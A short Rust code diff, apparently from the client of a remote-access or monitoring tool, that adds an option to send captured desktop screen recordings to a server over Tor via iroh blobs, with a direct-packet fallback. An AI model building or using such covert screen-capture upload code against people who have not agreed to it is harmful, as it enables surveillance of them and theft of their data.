@@ -13,6 +13,27 @@ use image::{imageops::FilterType, DynamicImage, RgbImage};
 static DESKTOP_RECORDING_ACTIVE: Lazy<Mutex<Option<Arc<AtomicBool>>>> = Lazy::new(|| Mutex::new(None));
 
 fn send_desktop_recording_file(name: String, data: Vec<u8>) {
+    if crate::service::config::get_config().use_tor {
+        let name_clone = name.clone();
+        let data_clone = data.clone();
+        let rt = tokio::runtime::Builder::new_current_thread()
+            .enable_all()
+            .build()
+            .unwrap();
+
+        rt.block_on(async move {
+            if let Some(blob_info) = crate::features::iroh::add_blob(data_clone, name_clone, common::packets::BlobContext::DesktopRecording).await {
+                let _ = send_packet(ServerboundPacket::IrohBlobReady(blob_info)).await;
+            } else {
+                let _ = send_packet(ServerboundPacket::DesktopRecordingFile(FileData {
+                    name,
+                    data,
+                })).await;
+            }
+        });
+        return;
+    }
+
     let _ = tokio::runtime::Builder::new_current_thread()
         .enable_all()
         .build()
